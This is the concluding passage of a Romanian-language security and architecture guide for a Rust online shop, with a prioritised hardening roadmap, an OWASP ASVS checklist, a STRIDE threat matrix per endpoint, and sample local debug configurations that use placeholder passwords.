| 21 | **Secret Manager** | Infrastructură | 1 zi | Chei furate din .env | ❌ |
| 22 | **Verus formal verification** | Formal | Săptămâni | Corectitudine matematică | ❌ (future) |

### Grafic efort → impact

```
Impact
  ▲
  │⚡ Parse, don't validate (2-3 zile)
  │⚡ Property-based testing (1-2 zile)
  │⚡ Newtype pattern (1-2 zile)
  │   ⚡ Type-state (3-5 zile)
  │   ⚡ Non-repudiation (1 zi)
  │   ⚡ Snapshot testing (1 zi)
  │    ⚡ STRIDE audit (2-3 ore)
  │     ⚡ Fuzz (3-5 zile)
  │      ⚡ CSRF tokens (2 zile)
  │       ⚡ Secret Manager (1 zi)
  │        ⚡ Verus (săptămâni)
  └───────────────────────────▶ Efort
    1h    1d     1s     1 lună
```

**Prioritare (sus-stânga):** Parse don't validate → Newtype → Property-based testing

---

## 31. Concluzii — Filosofia Unificată

### Cele 12 porunci arhitecturale

1. **Server-side first** — Dacă poți face fără JS, fă fără JS.
2. **PRG peste tot** — Orice POST → 302. Zero excepții.
3. **Tipuri, nu string-uri** — Parse, don't validate. Fiecare tip garantează validitatea.
4. **Stări în tipuri, nu în variabile** — Dacă o stare e invalidă, să nu compileze.
5. **Newtype peste tot** — `Email(String)` nu `String`.
6. **Fiecare handler, doar ce-i trebuie** — Capability-based. Niciodată `AppState` întreg.
7. **Trait-uri peste tot** — LEGO modules. Înlocuiești orice cu o linie.
8. **Testează proprietăți, nu cazuri** — Property-based testing. Găsește ce nu știi.
9. **Fuzz ce primește input** — Orice `parse`, `deserialize`, `from_str` merită fuzz.
10. **OWASP ASVS e Biblia** — Dacă nu știi ce lipsește la securitate, ASVS îți spune.
11. **STRIDE în fiecare sprint** — Înainte de un feature nou, gândește-te la cele 6 amenințări.
12. **Defense in depth** — Niciun strat nu e perfect. Pune mai multe.

### Mantra

> *"Mai puține bug-uri nu vin din mai multă testare.*
> *Vin din tipuri care fac bug-urile imposibile.*
> *Vin din arhitectură care izolează erorile.*
> *Vin din standarde care definesc clar ce înseamnă 'corect'."*

### Pentru shop-mvp — următorii pași

| Pas | Acțiune | Timp | Beneficiu |
|-----|---------|------|-----------|
| 1 | Adaugă `Email`, `Price`, `PhoneNumber` cu parse | 2-3 zile | Input invalid = imposibil |
| 2 | Adaugă proptest pentru `calculate_total` | 1 zi | 0 edge cases de overflow |
| 3 | Adaugă Newtype pattern (`SessionId`, `UserId`, `OrderId`) | 1 zi | Previi confuzia UUID-urilor |
| 4 | STRIDE audit pentru checkout | 2-3 ore | Plan de securitate |
| 5 | Type-state pentru Order | 3-5 zile | Stări invalide = 0 la runtime |
| 6 | Adaugă `audit_log` table | 1 zi | Non-repudiation |
| 7 | Fuzz pentru `parse_body` | 2-3 zile | Vulnerabilități ascunse |
| 8 | Snapshot testing pentru template-uri | 1 zi | Detectezi și cea mai mică schimbare |

---

## Anexa A — Checklist ASVS Level 1

- [x] V2.1: Argon2 password hashing
- [x] V2.2: Rate limiting pe login/signup
- [x] V3.1: HttpOnly, Secure, SameSite cookies
- [x] V4.1: Capability-based access control
- [x] V5.1: Input validation
- [x] V5.2: Reject invalid encoding (UTF-8 only)
- [x] V6.1: Tera auto-escape HTML output
- [x] V7.1: SHA-256 HMAC for JWT
- [x] V8.1: HTTPS enforced
- [x] V8.2: CSP header
- [x] V8.3: Cache-Control for sensitive pages
- [x] V9.1: HSTS header
- [x] V9.2: X-Frame-Options: DENY
- [x] V9.3: X-Content-Type-Options: nosniff
- [x] V10.1: CSP restricts script execution
- [x] V14.1: No default credentials
- [x] V14.2: `.env` in `.gitignore`

---

## Anexa B — STRIDE Matrix pentru shop-mvp

| Endpoint | S | T | R | I | D | E | Acțiune |
|----------|---|---|---|---|---|---|---------|
| `POST /login` | 🟡 | 🟢 | 🟢 | 🟢 | 🔴 | 🟢 | JWT + rate limiting |
| `POST /signup` | 🟡 | 🟢 | 🟢 | 🟢 | 🔴 | 🟢 | Rate limiting + email validation |
| `GET /products` | 🟢 | 🟢 | 🟢 | 🟢 | 🟡 | 🟢 | Paginare + cache |
| `GET /product/{slug}` | 🟢 | 🟢 | 🟢 | 🟢 | 🟡 | 🟢 | |
| `GET /cart` | 🟢 | 🟢 | 🟢 | 🟡 | 🟢 | 🟢 | Session-based |
| `POST /cart/add` | 🟢 | 🟡 | 🟢 | 🟢 | 🟢 | 🟢 | Validate product exists |
| `GET /checkout` | 🟢 | 🟢 | 🟢 | 🟡 | 🟢 | 🟡 | CART must not be empty |
| `POST /checkout` | 🟡 | 🟡 | 🔴 | 🟡 | 🟢 | 🟢 | Add audit log |
| `POST /order/{id}/pay` | 🟡 | 🔴 | 🔴 | 🟡 | 🟢 | 🟢 | Stripe idempotency |
| `GET /admin` | 🟢 | 🟢 | 🔴 | 🔴 | 🟢 | 🔴 | Role verification |
| `POST /admin/product/new` | 🟢 | 🔴 | 🔴 | 🔴 | 🟢 | 🔴 | Input validation |

**Legendă:** 🟢 protejat, 🟡 protejat parțial, 🔴 neprotejat

---

## Anexa C — Configurații recomandate

### `.env` pentru debug

```env
DATABASE_URL=postgresql://postgres:123123@localhost:5432/test
APP_ENV=dev
RUST_LOG=debug
RUST_BACKTRACE=full
SITE_URL=http://localhost:3001
JWT_SECRET=test-secret
STRIPE_SECRET_KEY=sk_test_...
MAX_QTY_PER_PRODUCT=20
```

### `.cargo/config.toml`

```toml
[target.x86_64-unknown-linux-gnu]
rustflags = ["-C", "link-arg=-fuse-ld=mold"]

[env]
RUSTC_WRAPPER = "/path/to/sccache-wrapper.sh"
```

### `compose.yml` (PostgreSQL + pgvector)

```yaml
services:
  postgres:
    image: pgvector/pgvector:pg18
    container_name: dev-postgres
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: 123123
      POSTGRES_DB: test
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 5

volumes:
  postgres_data:
```

---

> **"Mai puțin înseamnă mai mult.**
> **Zero JS e mai stabil decât orice librărie.**
> **Două binary-uri sunt mai sigure decât un monolit.**
> **Tipurile sunt mai bune decât testele."**
